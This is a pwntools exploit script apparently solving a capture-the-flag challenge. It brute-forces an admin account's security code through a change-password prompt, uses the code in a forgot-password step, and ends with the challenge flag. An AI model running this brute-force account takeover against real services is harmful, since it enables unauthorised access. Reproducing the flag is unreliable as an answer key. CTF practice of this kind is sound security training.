from pwn import *

CMDLINE = ["./vuln"]

elf = ELF(CMDLINE[0], checksec=False)

context.arch = "amd64"

class Exploit:
    LOCAL_HOST = "localhost"
    LOCAL_PORT = 1234
    REMOTE_HOST = "challenges.challenge-ecw.eu"
    REMOTE_PORT = 34472

    def __init__(self) -> None:
        if args.REMOTE:
            self.io = remote(self.REMOTE_HOST, self.REMOTE_PORT)
        elif args.LOCAL:
            self.io = remote(self.LOCAL_HOST, self.LOCAL_PORT)
        else:
            self.io = process(CMDLINE)
            if args.DBG:
                print(self.io.pid)
                pause()

    def new_user(self, username: bytes, password: bytes):
        self.io.sendlineafter(b"Command> ", b"n")
        self.io.sendlineafter(b"User name> ", username)
        self.io.sendlineafter(b"Password> ", password)
        self.io.recvuntil(b"code is ")
        sec_code = int(self.io.recvline(), 10)
        return sec_code

    def change_password(self, username: bytes, sec_code: int, new_password: bytes, skip: bool = False):
        self.io.sendlineafter(b"mand> ", b"p")
        self.io.sendlineafter(b"User name> ", username)
        self.io.sendlineafter(b"Security code> ", str(sec_code).encode())
        self.io.sendlineafter(b"New password> ", new_password)
        if self.io.recv(2) != b'If':
            print("Found admin at index %#x" % sec_code)
            return sec_code
        return None

    def forgot_password(self, username: bytes, sec_code: int, skip: bool = False):
        self.io.sendlineafter(b"mand> ", b"f")
        self.io.sendlineafter(b"User name> ", username)
        self.io.sendlineafter(b"Security code> ", str(sec_code).encode())
        print(self.io.recvline())

    def interactive(self):
        self.io.interactive()

    def close(self):
        self.io.close()

# handle SIGSEGV pass nostop noprint

io = Exploit()

for i in range(0x4000):
    ret = io.change_password(b"admin", i, b"AAAA")
    if ret != None:
        break

io.forgot_password(b"admin", ret)

io.interactive()
io.close()

# ECW{sometimes-less-is-more-870dfb8634639c63}
